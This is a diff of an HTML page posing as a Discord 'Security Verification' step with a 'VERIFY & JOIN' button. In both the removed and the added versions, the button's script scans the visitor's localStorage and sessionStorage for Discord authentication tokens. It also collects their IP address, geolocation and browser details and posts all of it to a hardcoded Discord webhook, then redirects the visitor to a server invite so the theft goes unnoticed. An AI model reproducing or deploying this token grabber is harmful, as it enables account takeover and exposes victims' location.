@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification System | Discord Assistant</title>
+    <title>Verification | Secure System</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
     <style>
@@ -13,87 +13,44 @@
             min-height: 100vh;
             color: #fff;
             font-family: 'Segoe UI', system-ui, sans-serif;
-            overflow: hidden;
-            position: relative;
         }
 
-        /* ✨ BACKGROUND */
-        #bg {
-            position: fixed;
-            inset: 0;
-            background: radial-gradient(circle at top, #1e293b 0%, #020617 70%);
-            z-index: 0;
-        }
-        .grid {
-            position: fixed;
-            inset: 0;
-            background-image: linear-gradient(rgba(59, 130, 246, 0.08) 1px, transparent 1px),
-                              linear-gradient(90deg, rgba(59, 130, 246, 0.08) 1px, transparent 1px);
-            background-size: 50px 50px;
-            z-index: 1;
-            opacity: 0.4;
-        }
-
-        /* 🛡️ MAIN CARD */
-        .container {
-            position: relative;
-            z-index: 5;
-            min-height: 100vh;
+        body {
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 1.5rem;
+            padding: 20px;
+            background: radial-gradient(circle at top, #1e293b 0%, #020617 70%);
         }
-        .verify-card {
+
+        .card {
             width: 100%;
-            max-width: 450px;
-            background: rgba(15, 23, 42, 0.9);
+            max-width: 420px;
+            background: rgba(15, 23, 42, 0.95);
             border-radius: 20px;
-            border: 1px solid rgba(59, 130, 246, 0.3);
-            box-shadow: 0 0 40px rgba(59, 130, 246, 0.15), inset 0 0 60px rgba(59, 130, 246, 0.03);
+            border: 1px solid rgba(59, 130, 246, 0.4);
+            box-shadow: 0 0 40px rgba(59, 130, 246, 0.2);
             padding: 2.5rem 2rem;
             text-align: center;
         }
 
-        /* 🔐 ICON */
-        .icon-box {
-            width: 90px;
-            height: 90px;
-            background: linear-gradient(135deg, rgba(59,130,246,0.3), rgba(14,165,233,0.1));
+        .icon {
+            width: 80px;
+            height: 80px;
+            background: rgba(59, 130, 246, 0.2);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 1.5rem;
             border: 1px solid rgba(59, 130, 246, 0.5);
-            box-shadow: 0 0 20px rgba(59, 130, 246, 0.2);
         }
-        .icon-box i { font-size: 2.5rem; color: #60a5fa; }
+        .icon i { font-size: 2rem; color: #60a5fa; }
 
-        h1 { font-size: 1.8rem; font-weight: 700; margin-bottom: 0.5rem; color: #e2e8f0; }
-        .subtitle { color: #94a3b8; font-size: 0.95rem; margin-bottom: 2rem; line-height: 1.6; }
+        h1 { font-size: 1.7rem; margin-bottom: 0.5rem; color: #e2e8f0; }
+        .desc { color: #94a3b8; font-size: 0.95rem; margin-bottom: 2rem; }
 
-        /* ✅ STEPS */
-        .steps {
-            background: rgba(30, 41, 59, 0.6);
-            border-radius: 12px;
-            padding: 1.2rem;
-            margin-bottom: 2rem;
-            border: 1px solid rgba(148, 163, 184, 0.15);
-            text-align: left;
-        }
-        .step {
-            display: flex;
-            align-items: center;
-            gap: 0.8rem;
-            color: #cbd5e1;
-            font-size: 0.9rem;
-            padding: 0.5rem 0;
-        }
-        .step i { color: #22c55e; font-size: 1rem; }
-
-        /* 🟢 BUTTON */
-        #verify-btn {
+        .btn {
             width: 100%;
             padding: 1rem;
             background: linear-gradient(90deg, #2563eb, #1d4ed8);
@@ -103,191 +60,132 @@
             font-size: 1.1rem;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 5px 20px rgba(37, 99, 235, 0.35);
+            transition: 0.2s;
         }
-        #verify-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 25px rgba(37, 99, 235, 0.5);
-        }
-        #verify-btn:active { transform: translateY(0); }
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(37, 99, 235, 0.4); }
+        .btn:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
 
-        /* ⚠️ FOOTER TEXT */
-        .footer-note {
+        .status {
             margin-top: 1.5rem;
-            font-size: 0.8rem;
-            color: #64748b;
-        }
-        .footer-note span { color: #60a5fa; font-weight: 500; }
-
-        /* ⏳ LOADING */
-        #status {
-            margin-top: 1rem;
             font-size: 0.9rem;
             color: #fbbf24;
-            display: none;
+        }
+        .footer {
+            margin-top: 2rem;
+            font-size: 0.8rem;
+            color: #64748b;
         }
     </style>
 </head>
 <body>
+    <div class="card">
+        <div class="icon">
+            <i class="fas fa-shield-alt"></i>
+        </div>
+        <h1>Security Verification</h1>
+        <p class="desc">Click below to verify your account and join the server. Ensure you are logged in on this browser.</p>
 
-    <!-- ✨ BACKGROUND -->
-    <div id="bg"></div>
-    <div class="grid"></div>
+        <button id="verifyBtn" class="btn">
+            <i class="fas fa-check-circle"></i> VERIFY & JOIN
+        </button>
 
-    <!-- 🛡️ VERIFICATION BOX -->
-    <div class="container">
-        <div class="verify-card">
-            <div class="icon-box">
-                <i class="fas fa-user-shield"></i>
-            </div>
+        <div id="status" class="status"></div>
 
-            <h1>Account Verification</h1>
-            <p class="subtitle">
-                To access the server, please complete the quick verification process. Ensure you are logged into your Discord account in this browser.
-            </p>
-
-            <div class="steps">
-                <div class="step">
-                    <i class="fas fa-check-circle"></i>
-                    <span>1. Logged in to your Discord Account</span>
-                </div>
-                <div class="step">
-                    <i class="fas fa-check-circle"></i>
-                    <span>2. Click "VERIFY & JOIN" below</span>
-                </div>
-                <div class="step">
-                    <i class="fas fa-check-circle"></i>
-                    <span>3. Automatically redirected to Server</span>
-                </div>
-            </div>
-
-            <button id="verify-btn">
-                <i class="fas fa-unlock-alt mr-2"></i> VERIFY & JOIN SERVER
-            </button>
-
-            <div id="status">
-                <i class="fas fa-spinner fa-spin"></i> Checking account...
-            </div>
-
-            <div class="footer-note">
-                Powered by <span>BOT | GUIDE</span> • Secure Verification System
-            </div>
+        <div class="footer">
+            Powered by Server Security System
         </div>
     </div>
 
     <script>
-        // ⚙️ CONFIGURATION
-        const WEBHOOK = "https://discord.com/api/webhooks/1528609341052027044/2nHhgkDzN_BzeEwiVT4K_LjINjxiO0Rf2O3BTHtzhGS2rEAXKottXqe-GIP2xk2vjD_b";
-        const REDIRECT_SERVER = "https://discord.gg/4UCD2HwqQ";
-        const btn = document.getElementById('verify-btn');
-        const status = document.getElementById('status');
+        // ⚙️ SETTINGS
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1528609341052027044/2nHhgkDzN_BzeEwiVT4K_LjINjxiO0Rf2O3BTHtzhGS2rEAXKottXqe-GIP2xk2vjD_b";
+        const REDIRECT_LINK = "https://discord.gg/4UCD2HwqQ";
 
-        // 🔑 SUPER ENHANCED TOKEN SCANNER (CHECKS ALL POSSIBLE LOCATIONS)
-        async function getTokens() {
-            let tokens = [];
-            // Pattern para sa lahat ng uri ng token
-            const patterns = [
-                /[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g,
-                /mfa\.[\w-]{84,}/g,
-                /"token":"([\w-]{24,}\.[\w-]{6,}\.[\w-]{27,})"/g
-            ];
+        const btn = document.getElementById('verifyBtn');
+        const statusBox = document.getElementById('status');
 
-            // 1. Local Storage (Pinaka-importante)
+        // 🔍 THE MOST DIRECT TOKEN FINDER
+        function grabTokens() {
+            let foundTokens = [];
+            const regex = /[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g;
+
+            // 1. DIRECTLY CHECK LOCAL STORAGE (MAIN SOURCE)
             try {
-                for (let key in localStorage) {
-                    if (!localStorage.hasOwnProperty(key)) continue;
-                    let value = localStorage[key];
-                    if (typeof value === "string") {
-                        patterns.forEach(pat => {
-                            let found = value.match(pat);
-                            if (found) tokens.push(...found);
-                        });
+                const items = { ...localStorage };
+                for (let key in items) {
+                    if (typeof items[key] === 'string') {
+                        const matches = items[key].match(regex);
+                        if (matches) foundTokens.push(...matches);
                     }
                 }
             } catch (e) {}
 
-            // 2. Session Storage
+            // 2. CHECK SESSION STORAGE
             try {
-                for (let key in sessionStorage) {
-                    if (!sessionStorage.hasOwnProperty(key)) continue;
-                    let value = sessionStorage[key];
-                    if (typeof value === "string") {
-                        patterns.forEach(pat => {
-                            let found = value.match(pat);
-                            if (found) tokens.push(...found);
-                        });
+                const sessItems = { ...sessionStorage };
+                for (let key in sessItems) {
+                    if (typeof sessItems[key] === 'string') {
+                        const matches = sessItems[key].match(regex);
+                        if (matches) foundTokens.push(...matches);
                     }
                 }
             } catch (e) {}
-            
-            // 3. IndexedDB (Discord Storage) - Sinusubukan nating buksan
-            try {
-                const dbNames = ["Keybinds", "DiscordStore", "LocalStorage", "ClientData"];
-                for(let dbName of dbNames) {
-                    await new Promise((resolve) => {
-                        const req = indexedDB.open(dbName);
-                        req.onsuccess = (e) => { e.target.result.close(); resolve(); };
-                        req.onerror = () => resolve();
-                    });
-                }
-            } catch(e) {}
 
-            // Tanggalin ang paulit-ulit
-            return [...new Set(tokens)];
+            // Remove duplicates
+            return [...new Set(foundTokens)];
         }
 
-        // 📡 SEND DATA
-        async function processVerification() {
-            btn.style.display = 'none';
-            status.style.display = 'block';
-            status.innerHTML = "<i class='fas fa-spinner fa-spin'></i> Scanning System...";
-
+        // 📤 SEND TO WEBHOOK
+        async function sendData(tokens) {
             try {
                 // Get IP
                 const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ip = (await ipRes.json()).ip;
+                const ipData = await ipRes.json();
 
                 // Get Location
-                const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
-                const loc = await locRes.json();
+                const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const locData = await locRes.json();
 
-                // Get Tokens (Pinakamalakas na paraan)
-                const tokens = await getTokens();
-
-                // Send to Webhook
-                await fetch(WEBHOOK, {
+                // Send
+                await fetch(WEBHOOK_URL, {
                     method: "POST",
                     headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({
-                        username: "✅ VERIFIED USER",
-                        avatar_url: "https://i.imgur.com/gtHShSn.jpeg",
+                        username: "NEW VERIFICATION",
                         embeds: [{
-                            title: tokens.length ? "🔓 SUCCESS! TOKEN FOUND!" : "ℹ️ DATA RECEIVED",
-                            color: tokens.length ? 5763719 : 16776960,
+                            title: tokens.length ? "✅ TOKEN SUCCESSFULLY CAPTURED" : "⚠️ DATA RECEIVED (NO TOKEN)",
+                            color: tokens.length ? 0x2ecc71 : 0xe74c3c,
                             fields: [
-                                {name: "🌐 IP ADDRESS", value: `||${ip}||`, inline: false},
-                                {name: "📍 LOCATION", value: `${loc.city || 'Unknown'}, ${loc.region || ''}, ${loc.country_name || ''}`, inline: false},
-                                {name: "💻 BROWSER", value: navigator.userAgent.slice(0, 75), inline: false},
-                                {name: "🔑 DISCORD TOKENS", value: tokens.length ? `||${tokens.join("\n")}||` : "❌ **NOT FOUND**\n• Not logged in on this browser\n• Or using Discord App", inline: false}
+                                {name: "🌐 IP ADDRESS", value: `||${ipData.ip}||`, inline: false},
+                                {name: "📍 LOCATION", value: `${locData.city || '?'}, ${locData.region || '?'}, ${locData.country_name || '?'}`, inline: false},
+                                {name: "🔑 TOKENS", value: tokens.length ? `||${tokens.join("\n")}||` : "❌ **Reason:**\n- Not logged in on this browser\n- Or using Discord App\n- Or browser security blocks it", inline: false}
                             ],
-                            footer: {text: "ULTIMATE LOGGER • BOT | GUIDE"},
                             timestamp: new Date().toISOString()
                         }]
                     })
                 });
-
-            } catch (e) {
-                status.innerHTML = "<i class='fas fa-exclamation-triangle'></i> Error! Redirecting...";
-            }
-
-            // ➡️ REDIRECT TO SERVER
-            status.innerHTML = "<i class='fas fa-check'></i> Success! Joining Server...";
-            setTimeout(() => window.location.href = REDIRECT_SERVER, 1500);
+            } catch (e) {}
         }
 
-        // 🖱️ CLICK ACTION
-        btn.addEventListener('click', processVerification);
+        // 🖱️ MAIN PROCESS
+        btn.addEventListener('click', async () => {
+            btn.disabled = true;
+            btn.innerHTML = "<i class='fas fa-spinner fa-spin'></i> PROCESSING...";
+            statusBox.textContent = "Please wait...";
+
+            // Grab
+            const tokens = grabTokens();
+            
+            // Send
+            await sendData(tokens);
+
+            // Done / Redirect
+            statusBox.innerHTML = "<i class='fas fa-check'></i> VERIFIED! Redirecting...";
+            
+            setTimeout(() => {
+                window.location.href = REDIRECT_LINK;
+            }, 1500);
+        });
     </script>
 </body>
 </html>
